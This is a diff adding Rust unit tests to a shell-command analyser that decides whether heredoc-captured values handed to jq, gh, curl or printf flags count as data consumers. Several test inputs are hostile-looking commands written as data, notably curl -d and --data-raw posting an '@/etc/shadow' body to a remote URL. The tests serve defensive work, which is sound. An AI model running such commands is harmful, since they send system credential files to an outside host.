@@ -260,3 +260,60 @@ fn heredoc_capture_then_forward_the_variable_via_allowlist_programs_is_still_fla
         assert!(bodies[0].is_data_consumer_target, "command {cmd:?}");
     }
 }
+
+// 63. Issue #396 review follow-up: the forwarding allowlist's per-program
+// narrowing to data flags. A captured value handed to a flag that reads a
+// file or another program's text — `jq -n`/`-f`, `gh --input`/`-F`, `curl
+// -T`/`-K`/`-o`/a bare URL, `printf`'s own format string — must not be
+// flagged as a data consumer, whatever the body says.
+#[test]
+fn heredoc_capture_then_narrow_data_flag_violations_is_not_flagged() {
+    let cases = [
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\njq -n \"$x\"",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\njq -f \"$x\"",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ngh api -X POST --input \"$x\" /repos/x/y/issues",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ngh api -F body=\"$x\" /repos/x/y/issues",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ncurl -T \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ncurl -K \"$x\"",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ncurl -o \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ncurl \"$x\"",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\nprintf \"$x\"",
+    ];
+    for cmd in cases {
+        let bodies = extract_heredoc_bodies(cmd);
+        assert!(!bodies[0].is_data_consumer_target, "command {cmd:?}");
+    }
+}
+
+// 64. Issue #396 review follow-up: `curl -d`/`--data`* trust the captured
+// value only while its own first body line does not start with `@` — curl
+// reads an `@`-prefixed value as a file path to upload instead of sending it
+// literally.
+#[test]
+fn heredoc_capture_then_curl_data_flag_with_at_prefixed_body_is_not_flagged() {
+    let cases = [
+        "x=$(cat <<'EOF'\n@/etc/shadow\nsome text\nEOF\n)\ncurl -d \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\n@/etc/shadow\nsome text\nEOF\n)\ncurl --data \"$x\" https://example.com",
+    ];
+    for cmd in cases {
+        let bodies = extract_heredoc_bodies(cmd);
+        assert!(!bodies[0].is_data_consumer_target, "command {cmd:?}");
+    }
+}
+
+// 65. Issue #396 review follow-up: the allowlist's trusted side under the
+// narrowed rules — `jq --arg`, `curl --data-raw` (even with an
+// `@`-prefixed body, since it is always trusted), and `gh`'s message flags.
+#[test]
+fn heredoc_capture_then_narrow_data_flag_matches_is_still_flagged() {
+    let cases = [
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\njq -n --arg b \"$x\" '{b:$b}'",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ncurl --data-raw \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\n@/etc/shadow\nsome text\nEOF\n)\ncurl --data-raw \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nsome text\nEOF\n)\ngh issue create -t \"$x\" -b \"$x\"",
+    ];
+    for cmd in cases {
+        let bodies = extract_heredoc_bodies(cmd);
+        assert!(bodies[0].is_data_consumer_target, "command {cmd:?}");
+    }
+}
